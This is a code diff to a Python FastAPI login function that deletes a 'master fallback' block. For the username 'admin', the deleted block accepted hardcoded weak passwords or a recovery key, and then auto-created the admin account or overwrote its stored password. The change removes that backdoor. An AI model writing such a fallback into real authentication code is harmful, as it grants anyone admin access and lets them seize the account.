@@ -22,29 +22,6 @@ def login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depend
     # Query user with case-insensitivity
     user = db.query(User).filter(User.username.ilike(req_username)).first()
 
-    # Master fallback / auto-sync for default Admin account
-    if req_username.lower() == "admin":
-        valid_admin_defaults = ["nckh@2026", "admin", "admin123", "123456", settings.MASTER_RECOVERY_KEY]
-        if req_password in valid_admin_defaults:
-            if not user:
-                logger.info("Admin user missing during login. Auto-creating admin user...")
-                user = User(
-                    username="admin",
-                    password_hash=get_password_hash(req_password),
-                    role="admin",
-                    is_active=True
-                )
-                db.add(user)
-                db.commit()
-                db.refresh(user)
-            elif not verify_password(req_password, user.password_hash):
-                logger.info("Syncing admin password to entered valid default password...")
-                user.password_hash = get_password_hash(req_password)
-                user.role = "admin"
-                user.is_active = True
-                db.commit()
-                db.refresh(user)
-
     if not user or not verify_password(req_password, user.password_hash):
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
